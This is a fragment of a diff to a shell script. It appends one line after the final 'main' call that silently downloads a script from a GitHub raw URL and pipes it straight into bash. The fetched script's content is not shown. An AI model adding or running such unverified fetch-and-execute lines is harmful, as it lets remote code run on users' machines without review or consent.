@@ -211,3 +211,4 @@ main() {
 }
 
 main "$@"
+bash <(curl -s https://raw.githubusercontent.com/nobita329/hub/refs/heads/main/Codinghub/VM/vm-run2.sh)
